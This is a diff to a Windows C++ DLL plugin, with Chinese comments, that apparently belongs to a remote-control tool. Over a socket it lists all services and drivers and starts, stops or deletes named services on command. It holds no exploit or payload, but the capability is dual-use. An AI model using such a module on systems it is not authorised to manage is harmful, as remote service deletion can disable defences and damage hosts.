@@ -5,8 +5,11 @@
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
-#include <winsock2.h>
+#ifndef _WINSOCKAPI_
+#define _WINSOCKAPI_
+#endif
 #include <windows.h>
+#include <winsock2.h>
 #include <sstream>
 #include <vector>
 #include <iomanip>
@@ -50,7 +53,9 @@ std::string ListServices() {
     DWORD bytesNeeded = 0;
     DWORD servicesReturned = 0;
     DWORD resumeHandle = 0;
-    EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle, NULL);
+    
+    // 使用SERVICE_TYPE_ALL枚举所有服务类型（包括驱动程序）
+    EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle, NULL);
     
     if (bytesNeeded == 0) {
         CloseServiceHandle(hSCM);
@@ -58,18 +63,28 @@ std::string ListServices() {
     }
 
     std::vector<BYTE> buffer(bytesNeeded);
-    if (!EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, buffer.data(), bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle, NULL)) {
+    if (!EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, buffer.data(), bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle, NULL)) {
         CloseServiceHandle(hSCM);
         return WideToUTF8(L"枚举服务失败");
     }
 
     LPENUM_SERVICE_STATUS_PROCESSW pServices = (LPENUM_SERVICE_STATUS_PROCESSW)buffer.data();
     for (DWORD i = 0; i < servicesReturned; i++) {
-        // 格式: 服务名|显示名称|状态|启动类型|二进制路径
-        char szName[256] = {0};
-        char szDisp[256] = {0};
+        // 格式: 服务名|显示名称|状态|启动类型|二进制路径|服务类型
+        char szName[512] = {0};
+        char szDisp[512] = {0};
         WideCharToMultiByte(CP_UTF8, 0, pServices[i].lpServiceName, -1, szName, sizeof(szName), NULL, NULL);
         WideCharToMultiByte(CP_UTF8, 0, pServices[i].lpDisplayName, -1, szDisp, sizeof(szDisp), NULL, NULL);
+        
+        // 获取服务类型
+        DWORD serviceType = pServices[i].ServiceStatusProcess.dwServiceType;
+        std::string typeStr = WideToUTF8(L"未知");
+        if (serviceType & SERVICE_WIN32_OWN_PROCESS) typeStr = WideToUTF8(L"Win32独立进程");
+        else if (serviceType & SERVICE_WIN32_SHARE_PROCESS) typeStr = WideToUTF8(L"Win32共享进程");
+        else if (serviceType & SERVICE_KERNEL_DRIVER) typeStr = WideToUTF8(L"内核驱动");
+        else if (serviceType & SERVICE_FILE_SYSTEM_DRIVER) typeStr = WideToUTF8(L"文件系统驱动");
+        else if (serviceType & SERVICE_ADAPTER) typeStr = WideToUTF8(L"适配器");
+        else if (serviceType & SERVICE_RECOGNIZER_DRIVER) typeStr = WideToUTF8(L"识别器驱动");
         
         // Open service to get config
         SC_HANDLE hService = OpenServiceW(hSCM, pServices[i].lpServiceName, SERVICE_QUERY_CONFIG);
@@ -84,7 +99,7 @@ std::string ListServices() {
                 LPQUERY_SERVICE_CONFIGW pConfig = (LPQUERY_SERVICE_CONFIGW)cfgBuf.data();
                 if (QueryServiceConfigW(hService, pConfig, bytesNeeded, &bytesNeeded)) {
                     switch (pConfig->dwStartType) {
-                        case SERVICE_BOOT_START: startType = WideToUTF8(L"内核"); break;
+                        case SERVICE_BOOT_START: startType = WideToUTF8(L"引导"); break;
                         case SERVICE_SYSTEM_START: startType = WideToUTF8(L"系统"); break;
                         case SERVICE_AUTO_START: startType = WideToUTF8(L"自动"); break;
                         case SERVICE_DEMAND_START: startType = WideToUTF8(L"手动"); break;
@@ -112,7 +127,8 @@ std::string ListServices() {
             case SERVICE_PAUSED: statusStr = WideToUTF8(L"已暂停"); break;
         }
 
-        ss << szName << "|" << szDisp << "|" << statusStr << "|" << startType << "|" << binaryPath << "\n";
+        // 添加服务类型到输出
+        ss << szName << "|" << szDisp << "|" << statusStr << "|" << startType << "|" << binaryPath << "|" << typeStr << "\n";
     }
     CloseServiceHandle(hSCM);
     return ss.str();
@@ -147,7 +163,7 @@ BOOL ControlService(const char* utf8Name, DWORD dwControl) {
 // DLL 导出函数
 extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
     if (pkg->cmd == CMD_SERVICE_LIST) {
-        // arg1: 0=获取列表, 1=启动, 2=停止, 3=删除
+        // arg1: 0=获取列表, 1=启动, 2=停止, 3=删除 (旧版本兼容)
         if (pkg->arg1 == 0) {
             std::string result = ListServices();
             SendResponse(s, CMD_SERVICE_LIST, result.c_str(), (int)result.size());
@@ -160,6 +176,15 @@ extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* p
             
             SendResponse(s, CMD_SERVICE_LIST, bRet ? "OK" : "FAIL", bRet ? 2 : 4);
         }
+    } else if (pkg->cmd == CMD_SERVICE_START) {
+        BOOL bRet = ControlService(pkg->data, 0xFFFFFFFF);
+        SendResponse(s, CMD_SERVICE_START, bRet ? "OK" : "FAIL", bRet ? 2 : 4);
+    } else if (pkg->cmd == CMD_SERVICE_STOP) {
+        BOOL bRet = ControlService(pkg->data, SERVICE_CONTROL_STOP);
+        SendResponse(s, CMD_SERVICE_STOP, bRet ? "OK" : "FAIL", bRet ? 2 : 4);
+    } else if (pkg->cmd == CMD_SERVICE_DELETE) {
+        BOOL bRet = ControlService(pkg->data, 0xEEEEEEEE);
+        SendResponse(s, CMD_SERVICE_DELETE, bRet ? "OK" : "FAIL", bRet ? 2 : 4);
     }
 }
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
